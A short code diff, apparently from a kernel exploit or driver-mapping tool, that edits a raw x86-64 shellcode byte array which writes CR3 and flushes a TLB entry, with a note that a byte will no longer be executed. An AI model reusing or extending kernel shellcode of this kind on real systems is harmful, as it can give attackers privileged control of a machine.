@@ -180,8 +180,9 @@ namespace shellcode {
 			0x48, 0x0F, 0x22, 0xD8,                                     // mov cr3, rax
 
 			// Flush the TLB for this page
-			0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, imm64 (page address) <- doesn't matter what to put here, it will not be executed
+			0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, imm64 (page address)
 			0x0F, 0x01, 0x38,											// invplg [rax]
+			0x58,														// pop rax <- Won't be executed anymore
 		};
 
 		static const uint8_t return_shellcode[] = {
